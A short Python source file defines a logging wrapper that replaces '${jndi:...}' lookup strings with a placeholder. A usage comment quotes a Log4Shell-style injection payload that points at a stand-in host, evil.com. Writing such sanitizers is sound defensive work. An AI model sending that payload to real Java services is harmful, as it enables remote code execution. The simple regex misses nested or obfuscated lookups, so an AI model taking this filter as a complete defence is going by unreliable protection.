import re
import logging

class SafeLog4jLogger:
    """A custom logger that prevents JNDI injection by stripping JNDI lookup patterns."""
    
    JNDI_PATTERN = re.compile(r'\$\{jndi:[^}]+\}', re.IGNORECASE)
    
    def __init__(self, name):
        self.logger = logging.getLogger(name)
    
    def _sanitize(self, message):
        """Remove JNDI injection patterns from the message."""
        if isinstance(message, str):
            return self.JNDI_PATTERN.sub('[SANITIZED]', message)
        return message
    
    def debug(self, message, *args, **kwargs):
        self.logger.debug(self._sanitize(message), *args, **kwargs)
    
    def info(self, message, *args, **kwargs):
        self.logger.info(self._sanitize(message), *args, **kwargs)
    
    def warning(self, message, *args, **kwargs):
        self.logger.warning(self._sanitize(message), *args, **kwargs)
    
    def error(self, message, *args, **kwargs):
        self.logger.error(self._sanitize(message), *args, **kwargs)
    
    def critical(self, message, *args, **kwargs):
        self.logger.critical(self._sanitize(message), *args, **kwargs)

# Usage example:
# logger = SafeLog4jLogger('myapp')
# logger.info('User input: ${jndi:ldap://evil.com/a}')
# This will log: 'User input: [SANITIZED]'